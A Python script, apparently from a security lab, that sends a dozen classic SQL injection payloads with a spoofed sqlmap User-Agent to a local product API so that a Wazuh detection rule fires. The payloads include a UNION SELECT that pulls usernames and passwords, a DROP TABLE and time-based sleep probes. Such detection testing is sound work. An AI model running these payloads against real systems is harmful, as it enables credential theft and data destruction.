"""
attack_sql_injection.py — SQLi probes against product_api.

Sends a series of classic SQLi payloads to /api/products?id=...
The product_api's verbose error messages will leak SQL info into the log,
which Wazuh rule 31103 will pick up.

Usage:
    python attack_sql_injection.py [--target http://localhost:5001]
"""

from __future__ import annotations

import argparse
import sys
import time
from urllib.parse import quote

import requests

PAYLOADS = [
    "1",
    "1' OR '1'='1",
    "1' UNION SELECT username, password, NULL FROM users--",
    "1; DROP TABLE products--",
    "1 OR 1=1",
    "1' AND SLEEP(5)--",
    "1' UNION SELECT NULL, NULL, NULL FROM information_schema.tables--",
    "0x31 OR 1=1",
    "1 AND (SELECT * FROM users)",
    "1' OR 'x'='x",
    "1; SELECT pg_sleep(5)--",
    "' OR username LIKE '%admin%' --",
]


def run(target: str, delay: float) -> int:
    base = f"{target.rstrip('/')}/api/products"
    print(f"[sqli] target={base}, payloads={len(PAYLOADS)}")

    fired = 0
    for payload in PAYLOADS:
        url = f"{base}?id={quote(payload)}"
        try:
            r = requests.get(
                url,
                headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"},
                timeout=10,
            )
            print(f"[sqli] {r.status_code}  payload={payload!r}")
            fired += 1
        except requests.RequestException as e:
            print(f"[sqli] error on {payload!r}: {e}", file=sys.stderr)
        time.sleep(delay)

    print(f"[sqli] DONE — {fired}/{len(PAYLOADS)} payloads sent")
    return 0


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://localhost:5001",
                   help="product_api base URL (or nginx fronting it)")
    p.add_argument("--delay", type=float, default=0.5, help="Seconds between requests")
    args = p.parse_args()
    return run(args.target, args.delay)


if __name__ == "__main__":
    sys.exit(main())
